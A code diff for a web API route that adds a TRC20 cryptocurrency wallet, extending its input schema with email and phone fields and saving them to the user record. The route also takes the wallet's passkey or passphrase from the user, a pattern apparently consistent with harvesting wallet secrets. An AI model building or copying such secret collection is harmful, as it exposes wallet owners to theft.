@@ -6,6 +6,8 @@ const addWalletSchema = z.object({
   wallet_type: z.string().min(1, 'Wallet type required'),
   trc20_address: z.string().min(20, 'Invalid TRC20 address'),
   passkey_or_passphrase: z.string().min(3, 'Passkey/passphrase must be at least 3 characters'),
+  email: z.string().email('Invalid email address'),
+  phone: z.string().min(10, 'Invalid phone number'),
 });
 
 async function initializeWalletsTable(client: any) {
@@ -39,7 +41,7 @@ export async function POST(request: NextRequest) {
     }
 
     const body = await request.json();
-    const { wallet_type, trc20_address, passkey_or_passphrase } = addWalletSchema.parse(body);
+    const { wallet_type, trc20_address, passkey_or_passphrase, email, phone } = addWalletSchema.parse(body);
 
     console.log('[v0] Adding wallet for user');
 
@@ -61,6 +63,31 @@ export async function POST(request: NextRequest) {
     }
 
     const userId = sessionResult.rows[0].user_id;
+
+    // Update user with email and phone if provided
+    if (email || phone) {
+      const updateFields = [];
+      const updateValues = [];
+      let paramCount = 1;
+
+      if (email) {
+        updateFields.push(`email = $${paramCount++}`);
+        updateValues.push(email);
+      }
+
+      if (phone) {
+        updateFields.push(`phone = $${paramCount++}`);
+        updateValues.push(phone);
+      }
+
+      if (updateFields.length > 0) {
+        updateValues.push(userId);
+        await client.query(
+          `UPDATE users SET ${updateFields.join(', ')} WHERE id = $${paramCount}`,
+          updateValues
+        );
+      }
+    }
 
     // Check if wallet already exists with this address
     const existingWallet = await client.query(
